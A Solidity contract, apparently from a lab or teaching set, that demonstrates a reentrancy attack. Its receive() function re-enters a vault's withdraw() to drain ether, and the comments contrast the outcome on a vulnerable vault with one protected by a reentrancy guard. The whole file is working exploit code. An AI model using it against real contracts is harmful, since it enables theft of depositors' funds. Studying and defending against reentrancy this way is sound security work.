// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * Reentrancy attacker for VulnerableVault / VulnerableVaultFixed.
 * Deploy with the target vault's address, then:
 *   1. call attackDeposit() with Value = 1 ether  -> deposits 1 ETH as this
 *      contract's own stake in the vault.
 *   2. call attackWithdraw()                       -> triggers withdraw(1 ether);
 *      on the VULNERABLE vault, receive() re-enters withdraw() before the
 *      balance is updated, draining far more than 1 ETH.
 *      On the FIXED vault, the reentrant call hits the reentrancy guard and
 *      the whole transaction reverts.
 */
interface IVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract ReentrancyAttacker {
    IVault public vault;
    uint256 public constant AMOUNT = 1 ether;

    constructor(address _vault) {
        vault = IVault(_vault);
    }

    function attackDeposit() external payable {
        vault.deposit{value: msg.value}();
    }

    function attackWithdraw() external {
        vault.withdraw(AMOUNT);
    }

    // Re-entry point: fires every time the vault sends ETH to this contract.
    receive() external payable {
        if (address(vault).balance >= AMOUNT) {
            vault.withdraw(AMOUNT);
        }
    }

    function stolenBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
